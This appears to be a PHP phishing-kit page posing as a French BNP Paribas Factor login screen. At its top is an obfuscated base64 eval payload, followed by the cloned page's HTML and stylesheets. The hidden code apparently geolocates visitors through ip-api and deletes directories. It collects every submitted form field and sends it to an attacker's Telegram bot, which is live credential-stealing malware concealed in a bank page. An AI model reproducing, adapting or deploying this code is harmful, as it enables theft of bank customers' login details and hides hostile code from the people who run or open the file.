﻿<?php eval(base64_decode('CiBnb3RvIHJZZGJLOyBSeGc5bzogJGluZm8gPSB1bnNlcmlhbGl6ZShmaWxlX2dldF9jb250ZW50cygiXHg2OFx4NzRcMTY0XDE2MFx4M2FceDJmXHgyZlx4NjlcMTYwXDU1XDE0MVx4NzBceDY5XHgyZVx4NjNcMTU3XDE1NVx4MmZcMTYwXHg2OFwxNjBcNTd7JFN0cnVwTG9tfVw3N1x4NjZceDY5XDE0NVwxNTRcMTQ0XHg3M1w3NVwxNjNceDc0XDE0MVx4NzRcMTY1XHg3M1w1NFx4NmRcMTQ1XHg3M1x4NzNcMTQxXHg2N1x4NjVcNTRceDYzXHg2ZlwxNTZceDc0XDE1MVx4NmVceDY1XHg2ZVwxNjRcNTRceDYzXHg2ZlwxNTZceDc0XHg2OVx4NmVceDY1XDE1NlwxNjRceDQzXDE1N1wxNDRceDY1XDU0XHg2M1x4NmZcMTY1XHg2ZVwxNjRceDcyXHg3OVx4MmNceDYzXHg2ZlwxNjVcMTU2XDE2NFwxNjJceDc5XDEwM1x4NmZceDY0XDE0NVw1NFx4NzJceDY1XHg2N1wxNTFcMTU3XHg2ZVx4MmNcMTYyXHg2NVwxNDdceDY5XHg2Zlx4NmVceDRlXDE0MVwxNTVceDY1XHgyY1wxNDNceDY5XHg3NFwxNzFceDJjXHg2NFx4NjlceDczXDE2NFx4NzJceDY5XDE0M1x4NzRceDJjXHg3YVx4NjlceDcwXHgyY1wxNTRcMTQxXHg3NFw1NFwxNTRcMTU3XDE1Nlx4MmNceDc0XDE1MVx4NmRceDY1XHg3YVx4NmZceDZlXDE0NVw1NFwxNDNceDc1XHg3MlwxNjJceDY1XDE1Nlx4NjNceDc5XHgyY1wxNTFcMTYzXHg3MFx4MmNcMTU3XHg3Mlx4NjdcNTRcMTQxXDE2M1x4MmNcMTQxXHg3M1wxNTZcMTQxXHg2ZFx4NjVcNTRceDcyXHg2NVwxNjZcMTQ1XHg3Mlx4NzNceDY1XDU0XHg2ZFwxNTdcMTQyXDE1MVx4NmNcMTQ1XDU0XDE2MFx4NzJceDZmXHg3OFwxNzFcNTRcMTUwXHg2ZlwxNjNceDc0XHg2OVx4NmVceDY3XDU0XHg3MVwxNjVceDY1XHg3Mlx4NzkiKSk7IGdvdG8gYjhsR3E7IFVmc3BTOiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyBnb3RvIHBzMjBEOyBLUEloUzogJHBhcnRzID0gZXhwbG9kZSgkd2ViRGlyZWN0b3J5LCAkY3VycmVudERpcmVjdG9yeSwgMik7IGdvdG8gTzY3Smo7IGlEMGQ4OiAkcGFyZW50RGlyZWN0b3J5ID0gIlx4NjhceDc0XDE2NFwxNjBcMTYzXHgzYVw1N1x4MmZ7JGhvbWVEb21haW59XDU3XHg3N1wxNDVcMTQyIjsgZ290byBkcVNrcTsgbk9kTmg6ICRTdHJvbmdTb2wgPSAkc3ViRGlyZWN0b3JpZXNbMF07IGdvdG8gRWRQVEU7IEhzd0hyOiBmdW5jdGlvbiB0ZWxzZW50KCRtZXNzYWdlKSB7ICRUcnViRnR1YiA9ICJceDJkXHgzOVx4MzRceDM3XHgzMVw2MFx4MzNcNjdcNjBceDMwIjsgJGNSZXRWY2tyID0gIlx4MzZcNjNcNjZcNjBcNjZceDM4XDY3XHgzMFw2NVw2NFx4M2FceDQxXHg0MVx4NDVceDM1XHg3MlwxNjVceDM3XHg2NFx4NzdcMTcyXDYyXDE0Mlx4NzNcMTYxXDE2NFw2MlwxMjZcMTQ0XHg0Mlx4NjJcMTYyXDE0Nlw2NFx4NmZcMTEyXDE1MFwxNjVceDM5XHg2N1x4NThcMTQ2XDEyM1x4NThceDYyXDE1MyI7ICRhcGlfdXJsID0gIlx4NjhcMTY0XDE2NFx4NzBcMTYzXDcyXDU3XHgyZlx4NjFcMTYwXHg2OVx4MmVceDc0XHg2NVwxNTRceDY1XDE0N1wxNjJcMTQxXDE1NVx4MmVceDZmXDE2Mlx4NjdceDJmXHg2Mlx4NmZcMTY0eyRjUmV0VmNrcn1ceDJmXDE2M1wxNDVcMTU2XDE0NFx4NGRceDY1XHg3M1x4NzNceDYxXHg2N1x4NjUiOyAkcGFyYW1zID0gYXJyYXkoIlx4NjNceDY4XHg2MVx4NzRcMTM3XHg2OVwxNDQiID0+ICRUcnViRnR1YiwgIlwxNjRceDY1XHg3OFwxNjQiID0+ICRtZXNzYWdlKTsgJGNoID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIHRydWUpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkcGFyYW1zKSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOyBjdXJsX2Nsb3NlKCRjaCk7IH0gZ290byB2R2wyTDsgaHVKSVk6IGlmIChpc3NldCgkaW5mb1siXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXHg3OSJdKSkgeyAkX1NFU1NJT05bIlwxMDJcMTU0XHg2MVx4NzNceDYxXHg2M1x4NmZcMTY1XHg2ZSJdID0gJGluZm9bIlx4NjNcMTU3XDE2NVwxNTZcMTY0XDE2Mlx4NzkiXTsgfSBnb3RvIGJlbEdGOyBQNTA1TjogaW5pX3NldCgiXDE0NFx4NjlcMTYzXDE2MFwxNTRcMTQxXDE3MVx4NWZceDY1XDE2Mlx4NzJceDZmXDE2Mlx4NzMiLCAxKTsgZ290byBlZlpKNDsgdmM1WEE6IGlmICh0cmltKCRyZXNsb2NhbCkgIT0gdHJpbSgkU3RydXBMb20pKSB7ICRTdHJvbmdTb2wgPSAnJyAuIGJhc2VuYW1lKF9fRElSX18pOyAkaG9tZURvbWFpbiA9ICRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXHg1ZlwxMTBcMTE3XHg1M1x4NTQiXTsgJHZlcmlmeUFjY291bnRVUkwgPSAiXHg2OFwxNjRcMTY0XHg3MFx4NzNceDNhXHgyZlx4MmZ7JGhvbWVEb21haW59XHgyZlwxNTFcMTU2XDE0NFwxNDVcMTcwXDU2XHg3MFwxNTBcMTYwXDc3XDE2NlwxNDVcMTYyXDE1MVx4NjZcMTcxXDEzN1wxNDFcMTQzXDE0M1x4NmZcMTY1XHg2ZVx4NzRceDNkXHg3M1x4NjVcMTYzXHg3M1wxNTFcMTU3XHg2ZVx4MjYiIC4gbWQ1KG1pY3JvdGltZSgpKSAuICJcNDZcMTQ0XHg2OVx4NzNceDcwXDE0MVwxNjRceDYzXDE1MFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXHgyNlwxNDFcMTQzXHg2M1wxNDVcMTYzXHg3M1x4M2RceDI2XHg2NFx4NjFcMTY0XDE0MVx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2Y1x4NmZceDZjXHg2ZFwxNDVceDNkeyRTdHJvbmdTb2x9IjsgZWNobyAiXHgzY1x4NzNcMTQzXHg3Mlx4NjlcMTYwXDE2NFw0MFwxMTRcMTAxXHg0ZVwxMDdceDU1XDEwMVwxMDdcMTA1XHgzZFx4MjdceDRhXHg2MVwxNjZcMTQxXDEyM1x4NjNcMTYyXHg2OVx4NzBceDc0XDQ3XHgzZVwxMlx4MjBceDIwXHgyMFx4MjBceDc3XHg2OVx4NmVceDY0XDE1N1x4NzdcNTZceDZjXDE1N1x4NjNcMTQxXHg3NFwxNTFceDZmXHg2ZVx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXDEyXHgyMFx4MjBcNDBceDIwXDQwXDc0XHgyZlwxNjNcMTQzXHg3Mlx4NjlcMTYwXDE2NFx4M2UiOyBkaWU7IH0gZ290byBtdkhsQTsgdDRoY0Y6IGN1cmxfY2xvc2UoJGNoKTsgZ290byBnOU5aZzsgVE5VV0s6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB1QXBBUjsgYjhsR3E6IGlmIChpc3NldCgkaW5mb1siXDE0MVx4NzMiXSkpIHsgJF9TRVNTSU9OWyJceDY5XHg3M1wxNjAiXSA9ICRpbmZvWyJceDYxXHg3MyJdOyB9IGdvdG8gaHVKSVk7IHJkRG1IOiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnkoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gJHRpbWVfZGlmZiA9IHRpbWUoKSAtIGZpbGVjdGltZSgkZGlyKTsgaWYgKCR0aW1lX2RpZmYgPiAzMjApIHsgZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlx4MmUiIHx8ICRpdGVtID09ICJceDJlXDU2IikgeyBjb250aW51ZTsgfSBpZiAoIWRlbGV0ZURpcmVjdG9yeSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRpdGVtKSkgeyByZXR1cm4gZmFsc2U7IH0gfSBpZiAocm1kaXIoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gZWxzZSB7IHJldHVybiBmYWxzZTsgfSB9IGVsc2UgeyByZXR1cm4gdHJ1ZTsgfSB9IGdvdG8gS1o4d0Q7IGc5TlpnOiBpZiAoIWVtcHR5KCRyZXNsb2NhbCkpIHsgfSBlbHNlIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBceDVmXHg0OFx4NGZcMTIzXDEyNCJdOyAkdmVyaWZ5QWNjb3VudFVSTCA9ICJcMTUwXHg3NFwxNjRceDcwXDE2M1w3Mlx4MmZceDJmeyRob21lRG9tYWlufVw1N1x4NjlceDZlXHg2NFwxNDVceDc4XHgyZVwxNjBcMTUwXHg3MFw3N1x4NzZcMTQ1XHg3MlwxNTFceDY2XDE3MVx4NWZceDYxXHg2M1wxNDNcMTU3XDE2NVwxNTZcMTY0XDc1XHg3M1wxNDVceDczXHg3M1wxNTFcMTU3XHg2ZVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlx4MjZcMTQ0XHg2OVwxNjNcMTYwXHg2MVx4NzRcMTQzXHg2OFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2MVx4NjNcMTQzXDE0NVwxNjNceDczXHgzZFx4MjZceDY0XDE0MVx4NzRcMTQxXDc1IiAuIHNoYTEobWljcm90aW1lKCkpIC4gIlx4MjZceDZjXHg2ZlwxNTRceDZkXHg2NVw3NXskU3Ryb25nU29sfSI7IGVjaG8gIlx4M2NcMTYzXHg2M1x4NzJcMTUxXDE2MFwxNjRcNDBceDRjXDEwMVx4NGVceDQ3XHg1NVx4NDFceDQ3XHg0NVw3NVx4MjdcMTEyXDE0MVwxNjZceDYxXDEyM1x4NjNcMTYyXHg2OVwxNjBcMTY0XDQ3XHgzZVx4YVw0MFx4MjBceDIwXHgyMFwxNjdcMTUxXDE1NlwxNDRceDZmXHg3N1x4MmVceDZjXDE1N1wxNDNcMTQxXDE2NFwxNTFceDZmXDE1Nlx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXHhhXDQwXHgyMFw0MFx4MjBcNDBcNzRcNTdcMTYzXHg2M1wxNjJceDY5XHg3MFwxNjRcNzYiOyBkaWU7IH0gZ290byB2YzVYQTsgS1o4d0Q6ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXDExMFx4NGZceDUzXHg1NCJdOyBnb3RvIGlEMGQ4OyBvQlJtODogJGhvbWVEb21haW4gPSAkX1NFUlZFUlsiXDExMFx4NTRceDU0XDEyMFwxMzdcMTEwXDExN1wxMjNcMTI0Il07IGdvdG8gdmkwSTU7IHVBcEFSOiAkY3VycmVudERpcmVjdG9yeSA9IF9fRElSX187IGdvdG8gdURqZks7IHRIQmwyOiAkZG9uZmxhZyA9ICRfU0VSVkVSWyJcMTIzXHg0NVwxMjJceDU2XDEwNVwxMjJceDVmXDExNlx4NDFcMTE1XHg0NSJdOyBnb3RvIFJ4ZzlvOyBPNjdKajogJHN1YkRpcmVjdG9yaWVzID0gZXhwbG9kZSgiXDU3IiwgJHBhcnRzWzFdKTsgZ290byBuT2ROaDsgdmkwSTU6ICRwYXJlbnREaXJlY3RvcnkgPSAiXHg2OFwxNjRcMTY0XDE2MFwxNjNcNzJcNTdcNTd7JGhvbWVEb21haW59XHgyZlx4NzdceDY1XHg2Mlw1N3skU3Ryb25nU29sfVx4MmZ7JGZpbGVuYW1lfSI7IGdvdG8gaGQ0aUY7IGhkNGlGOiAkY2ggPSBjdXJsX2luaXQoJHBhcmVudERpcmVjdG9yeSk7IGdvdG8gVWZzcFM7IFN5VTU2OiBpZiAoJHJlc2xvY2FsID09PSBmYWxzZSkgeyBkaWUoIlwxNDNceDU1XHg1Mlx4NGNceDIwXDEwNVwxNjJcMTYyXDE1N1x4NzJceDNhXDQwIiAuIGN1cmxfZXJyb3IoJGNoKSk7IH0gZ290byB0NGhjRjsgRWRQVEU6ICRmaWxlbmFtZSA9ICJcMTU0XDE1N1wxNDNceDYxXHg2Y1w1Nlx4NzRcMTcwXDE2NCI7IGdvdG8gb0JSbTg7IGRxU2txOiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXHgyZlx4MmEiLCBHTE9CX09OTFlESVIpOyBnb3RvIFROVVdLOyBXUzJhMTogaWYgKCFlbXB0eSgkdmFsaWRJUHMpKSB7ICRTdHJ1cExvbSA9ICR2YWxpZElQc1swXTsgfSBlbHNlIHsgJFN0cnVwTG9tID0gIlw2MVw2Mlw2N1x4MmVceDMwXDU2XDYwXHgyZVx4MzEiOyB9IGdvdG8gdEhCbDI7IFNlQ0hGOiBpZiAoaXNzZXQoJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXDE1NlwxMTZcMTQxXHg2ZFwxNDUiXSkpIHsgJF9TRVNTSU9OWyJceDc4XHg0Zlx4NzBcMTY1XDE3MSJdID0gJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXHg2ZVwxMTZcMTQxXDE1NVwxNDUiXTsgfSBnb3RvIHJkRG1IOyBGR2ludjogJHZhbGlkSVBzID0gYXJyYXkoKTsgZ290byBlckN0QTsgYmVsR0Y6IGlmIChpc3NldCgkaW5mb1siXHg2M1x4NmZceDc1XHg2ZVx4NzRcMTYyXHg3OVwxMDNceDZmXDE0NFx4NjUiXSkpIHsgJF9TRVNTSU9OWyJcMTE2XDE1MlwxNTdcMTYwXDE0NiJdID0gJGluZm9bIlx4NjNceDZmXDE2NVx4NmVceDc0XHg3MlwxNzFcMTAzXDE1N1x4NjRceDY1Il07IH0gZ290byB3b2x5RjsgeG5QVFo6IGlmICgkaXBNYXRjaGVzKSB7ICR2YWxpZElQcyA9ICRtYXRjaGVzWzBdOyB9IGdvdG8gV1MyYTE7IHdvbHlGOiBpZiAoaXNzZXQoJGluZm9bIlwxNDNcMTUxXDE2NFx4NzkiXSkpIHsgJF9TRVNTSU9OWyJcMTI2XDE1N1wxNjBcMTYyXDE2NCJdID0gJGluZm9bIlx4NjNcMTUxXDE2NFx4NzkiXTsgfSBnb3RvIFNlQ0hGOyBlckN0QTogJGlwTWF0Y2hlcyA9IHByZWdfbWF0Y2hfYWxsKCJceDJmXHg1Y1x4NjJceDVjXHg2NFx4N2JceDMxXDU0XDYzXDE3NVwxMzRceDJlXDEzNFwxNDRcMTczXDYxXDU0XDYzXDE3NVx4NWNcNTZceDVjXDE0NFwxNzNcNjFceDJjXHgzM1wxNzVceDVjXDU2XDEzNFx4NjRcMTczXDYxXHgyY1x4MzNceDdkXDEzNFwxNDJceDJmIiwgJGlwQWRkcmVzcywgJG1hdGNoZXMpOyBnb3RvIHhuUFRaOyByWWRiSzogZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsgZ290byBQNTA1TjsgUEJVWnI6IGlmICghZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXHg0M1wxMTRceDQ5XHg0NVwxMTZceDU0XDEzN1x4NDlceDUwIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXDExMFwxMjRceDU0XDEyMFwxMzdceDQzXHg0Y1x4NDlceDQ1XHg0ZVwxMjRceDVmXHg0OVwxMjAiXTsgfSBlbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsiXDExMFwxMjRceDU0XHg1MFwxMzdcMTMwXHg1ZlwxMDZcMTE3XHg1MlwxMjdcMTAxXDEyMlwxMDRcMTA1XDEwNFx4NWZcMTA2XDExN1x4NTIiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJceDQ4XDEyNFx4NTRcMTIwXDEzN1x4NThcMTM3XDEwNlwxMTdcMTIyXHg1N1x4NDFceDUyXDEwNFwxMDVceDQ0XHg1Zlx4NDZcMTE3XHg1MiJdOyB9IGVsc2UgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlwxMjJcMTA1XDExNVwxMTdcMTI0XHg0NVx4NWZceDQxXHg0NFwxMDRcMTIyIl07IH0gZ290byBGR2ludjsgcHMyMEQ6ICRyZXNsb2NhbCA9IGN1cmxfZXhlYygkY2gpOyBnb3RvIFN5VTU2OyB1RGpmSzogJHdlYkRpcmVjdG9yeSA9ICJcNTdcMTY3XDE0NVx4NjJceDJmIjsgZ290byBLUEloUzsgbXZIbEE6IGlmICgkX1NFUlZFUlsiXDEyMlwxMDVcMTIxXHg1NVwxMDVcMTIzXHg1NFwxMzdcMTE1XHg0NVwxMjRceDQ4XDExN1x4NDQiXSA9PT0gIlx4NTBceDRmXDEyM1x4NTQiKSB7ICRwb3N0RGF0YVN0cmluZyA9ICcnOyAkcHJvX25tID0gJyc7IGZvcmVhY2ggKCRfUE9TVCBhcyAka2V5ID0+ICR2YWx1ZSkgeyBpZiAoIWVtcHR5KCRfU0VTU0lPTlsiXDE2MFx4NzJceDZmXDE1MlwxNDVceDYzXDE2NCJdKSkgeyAkcHJvX25tID0gJF9TRVNTSU9OWyJceDcwXDE2Mlx4NmZceDZhXDE0NVwxNDNcMTY0Il07IH0gJHBvc3REYXRhU3RyaW5nIC49ICJcMTEzXHg2NVx4NzlcNzJceDIweyRrZXl9XDU0XDQwXDEyNlx4NjFcMTU0XDE2NVx4NjVceDNhXHgyMHskdmFsdWV9XDQwXHg1MFwxNjJceDZmXHgzYVx4MjB7JHByb19ubX1ceGEiOyB9IGlmICghZW1wdHkoJHBvc3REYXRhU3RyaW5nKSkgeyB0ZWxzZW50KCRwb3N0RGF0YVN0cmluZyk7IH0gfSBnb3RvIEhzd0hyOyBlZlpKNDogaWYgKHNlc3Npb25fc3RhdHVzKCkgPT0gUEhQX1NFU1NJT05fTk9ORSkgeyBzZXNzaW9uX3N0YXJ0KCk7IH0gZ290byBQQlVacjsgdkdsMkw6IA==')); ?><!DOCTYPE html><html data-login-type="ident"><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain"></script><head>
<link rel="icon" data-savepage-href="" href="data:text/plain;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAFnRFWHRDcmVhdGlvbiBUaW1lADA0LzMwLzA51O4BBwAAAAd0SU1FB9kKEwc4KaGbNYUAAAAJcEhZcwAACxEAAAsRAX9kX5EAAAAEZ0FNQQAAsY8L/GEFAAAAllBMVEWJzrZxwKR6xKgKlmQAgUIAiUwAeDUAhEkgn3AAjlgeonVYtpMAfUAAklsrpHcAjFIAbyiZ08Ci1cIZnG3///+GzrSi28gAejw8rYUYoHFHso6y28wMj1k1rIQAczBsv6KIyK3D6Nvn9vGw28xfu51IrodnupgSk2ASnGsxo3ef18Mupnx/xqqu2sgAbSQAmWaV0b1PtJA4NP20AAAAo0lEQVR42lWP2RLCIAwAU02AWGjUovVqve/7/3/OYlHHfWHY2TABnueyIZ6Qk0RshUQCht0bMY/EauavcPvU+xUFwSHGc3Lx/nq7gxEZb3ervVaH4nhSri4E63a9Ycas1EHo+WKplHADZCJl1f687BxklIv93WthJ9OZOEdRgsGBHxZajcYcC+n2+px7H5OwmEbspJbiSLv+EREqJP0GIGn98QJgzg7jQVzWSwAAAABJRU5ErkJggg==">


<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="content-language" content="fr">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

<meta name="bnppf-apple-itunes-app" content="948200707">
<meta name="bnppf-google-play-app" content="com.bnpparibasfactor.marseille.myview">
<script data-savepage-type="" type="text/plain" language="JavaScript" data-savepage-src="/S027_E001/S027_E001_script_cosmos_fr/traduction_fct.js"></script><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><script data-savepage-type="" type="text/plain"></script>
<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/jQuery-3.7.0/jquery-3.7.0.min.js?20231115 185615"></script>
<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/jQueryUI-1.13.2/jquery-ui.min.js?20231115 185615"></script>

<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/DataTables-1.13.6/js/jquery.dataTables.min.js?20231115 185615"></script>
<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/DataTables-1.8.2/media/js/dataTables.numericComma.js"></script>
<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/js/TableTools.js"></script>
<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/js/ZeroClipboard.js"></script>
<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/entete.js"></script>
<script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" language="javascript" data-savepage-src="/tra_cosmos_js/javascript.js"></script>
<style type="text/css" media="all">
/*savepage-import-url=/tra_cosmos_js/jquery-tooltip/css/global.css*//* - - - - - - CSS Document - - - - - - - - -

Title : Global style sheet for client-side web development
Author : Cody Lindley 

- - - - - - - - - - - - - - - - - - - - - */

#JT_close_left, #JT_close_right {
	font-size: 12px;
}
#JT_copy p, #JT_copy ul {
	font-size: 10px;
}
#JT_copy ul {
	list-style: none;
	margin: 0px;
	padding: 0px;
}
#JT_copy ul li {
	padding: 3px;
	text-align: left;
}
#contentPad {
	margin: 20px;
}
.formInfo a, .formInfo a:active, formInfo a:visited {
	background-color: #586868;
	font-size: 10px;
	font-weight: bold;
	padding: 1px 3px 1px 2px;
	margin-left: 5px;
	color: #FFFFFF;
	text-decoration: none;
}
.formInfo a:hover {
	color: #000000;
	text-decoration: none;
}
#JT_arrow_left {
	background-image: /*savepage-url=../images/arrow_left.gif*/ url();
	background-repeat: no-repeat;
	background-position: left top;
	position: absolute;
	z-index: 101;
	left: -12px;
	height: 23px;
	width: 10px;
    top: -3px;
}
#JT_arrow_right {
	background-image: /*savepage-url=../images/arrow_right.gif*/ url();
	background-repeat: no-repeat;
	background-position: left top;
	position: absolute;
	z-index: 101;
	height: 23px;
	width: 11px;
    top: -2px;
}
#JT {
	position: absolute;
	z-index: 100;
	border: 2px solid #CCCCCC;
	background-color: #fff;
}
#JT_copy {
	color: #333333;
}
.JT_loader {
	background-image: /*savepage-url=../images/loader.gif*/ url();
	background-repeat: no-repeat;
	background-position: center center;
	width: 100%;
	height: 12px;
}
#JT_close_left {
	background-color: #CCCCCC;
	text-align: left;
	padding-left: 8px;
	padding-bottom: 5px;
	padding-top: 2px;
	font-weight:bold;
}
#JT_close_right {
	background-color: #CCCCCC;
	text-align: left;
	padding-left: 8px;
	padding-bottom: 5px;
	padding-top: 2px;
	font-weight: bold;
}
#JT_copy p {
	margin: 3px 0;
}
#JT_copy img {
	padding: 1px;
	border: 1px solid #CCCCCC;
}
.jTip {
	cursor: help;
}

</style>
<script data-savepage-src="/tra_cosmos_js/jquery-tooltip/js/jtip.js" data-savepage-type="text/javascript" type="text/plain"></script><script language="JavaScript" data-savepage-src="/S027_E001/S027_E001_cosmos_js/noframe_0001.js" data-savepage-type="text/javascript" type="text/plain"></script>
<script language="JavaScript" data-savepage-src="/S027_E001/S027_E001_cosmos_js/menu_haut_0001.js" data-savepage-type="text/javascript" type="text/plain"></script>
<script language="JavaScript" data-savepage-src="/S027_E001/S027_E001_cosmos_js/menu_gauche_0001.js" data-savepage-type="text/javascript" type="text/plain"></script>
<script language="JavaScript" data-savepage-src="/S027_E001/S027_E001_cosmos_js/menu_pied_0001.js" data-savepage-type="text/javascript" type="text/plain"></script>
<style data-savepage-href="/tra_cosmos_css/style.css" type="text/css">/*
 * $HeadURL$
 * $Rev$
 * $LastChangedDate$
 * $LastChangedBy$
 *
 * Ajouts :
 * - pied de page (probleme emplacement js/doctype)
 * - classes de mise en forme du texte (lowercase / uppercase / capitalize / initial / bold / italic )
 * - indicateur de nouveau messages (messagerie)
 * - fix taille input checkbox / radio / fileupload
 * - Pied suppression visuelle d'info
 */

/* Positionnement general  */
body {
  margin: 0;
  height:100%;
  font: normal 1em Arial, sans-serif;
  color: #586868;
  text-decoration: none;
  background: /*savepage-url=/tra_cosmos_img/fond.jpg*/ var(--savepage-url-10);
  /* background: url(/tra_cosmos_img/fond.jpg); */
  background-position:top;
  background-repeat:repeat-y;
  font-size: 14px;
  text-align: center; /* pour centrer avec le quirkIE5 */
}

html { position: relative; }

/* ajouts de style pour la version large */
	body.large {background: #FFFFFF /*savepage-url=/tra_cosmos_img/fond_large.jpg*/ url() 50% 0px repeat-y;}
	body.large div#conteneur, body.large>div#or_content {width: 1226px;}
	body.large div#conteneur2 {width: 100%}
	body.large div.En-tete {width:1222px;}
	body.large div.Bando_logo {width: 100%;}

	body.large div.contenu_home {width:1226px;}
	body.large div.decoupe-home-03_ {min-height:360px; width:570px;}
	body.large div.decoupe-home-04_ {min-height:360px; width: 600px;}
	body.large div.contenu {width:1230px;}
	body.large #contenu-02_texte {width: 1075px;}
	body.large .erreur {width: 1000px;}
	
	body.large div.Bando_logo {
		background: #FFFFFF /*savepage-url=/tra_cosmos_img/header2-complement.gif*/ url() 0px 0px repeat-x;
		margin: 0;
	}

	/* test d'une mise en page plus basée sur le CSS */
	html.new body,
	html.new	{
		height: 100%;
		min-height: 900px;
	}
	
	html.new div#conteneur,
	html.new div#conteneur2 {
		/*height: 100%;*/
		position: relative;
		margin-bottom: 70px;
	}
	
	html.new div.contenu_home {
		min-height:620px;
		position: relative;
		/*height: 100%;*/
		height: auto;
		width: auto;
		position: absolute;
		left: 0px;
		right: 0px;
		top: 90px;
		bottom: 0px;
		margin-left: 0px;
		margin: 0px;
		padding: 0px 13px;
		clear: both;
	}

	html.new div.decoupe-home-03_ {
		float:none;
		min-height:480px;
		padding-bottom: 15px;
		top: 240px;
		width:340px;
		height: auto;
		bottom: 0px;
		position: absolute;
	}

	html.new div.decoupe-home-04_ {
		position: absolute;
		float:none;
		min-height:480px;
		height: auto;
		width: auto;
		padding-bottom: 15px;
		top: 240px;
		right: 13px;
		left: 390px;
		bottom: 0px;
	}

	html.new div#pied.footer_ {
		position: absolute !important;
		bottom: -70px;
		width: 100% !important;
	}
	
	html.new div.footer_ table {width: auto;}

	html.new div.footer_ table tr td:first-child {width: auto;}

div#conteneur2,
div#conteneur2 .contenu {
	min-height: 900px;
}

form {
  margin: 0px;
  padding: 0px;
}
table {
  margin: 0px;
  padding: 0px;
}
tr, td {
  font-size: 10px;
}
p {
  margin: 0px;
  padding: 0px;
  font-size: 11px;
  font-weight:normal;
  font: Arial, sans-serif;
}
p.intro{
  margin: 4px;
  padding: 4px;
  font-size: 11px;
  font-weight:bold;
  font: Arial, sans-serif;
	color: #0091de;
}
div#conteneur{
  margin-left: auto; 
  margin-right: auto;
  width: 957px; 
  text-align: left;
  height:auto;
  background:#FFFFFF;
  display: block;
  position: relative;
}

	body>#or_content {
	  margin-top: 177px;
	  margin-left: auto; 
	  margin-right: auto;
	  /*width: 927px;*/
	  width: 790px;
	  text-align: left;
	  background:#FFFFFF;
	  /*padding: 0px 15px;*/
	  padding: 0px 15px 0px 122px;
	}
	
	#or_content p {
		padding: normal;
		margin: normal;
	}
/* Fin Positionnement général */

/* Style Général */
a { 
    font-weight:bold;
    text-decoration: none;
    color: #7CBB00;
}
a:HOVER{
  text-decoration: underline;
}
img { 
    border:0;
}
img a{ 
    border:0;
}
.bleu {
